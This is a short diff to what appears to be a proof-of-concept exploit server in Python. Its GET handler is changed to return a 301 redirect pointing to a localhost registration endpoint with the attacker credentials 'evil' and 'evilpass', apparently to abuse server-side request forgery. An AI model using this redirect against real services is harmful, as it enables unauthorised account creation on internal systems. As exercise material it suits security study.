@@ -28,7 +28,7 @@ from http.server import HTTPServer, BaseHTTPRequestHandler
 
 class pyhandler(BaseHTTPRequestHandler):
     def do_GET(self):
-        self.send_response(200)
+        self.send_response(301)
         self.send_header('Location', 
         'http://127.0.0.1/register?username=evil&password=evilpass&confirm=evilpass')
         self.end_headers()
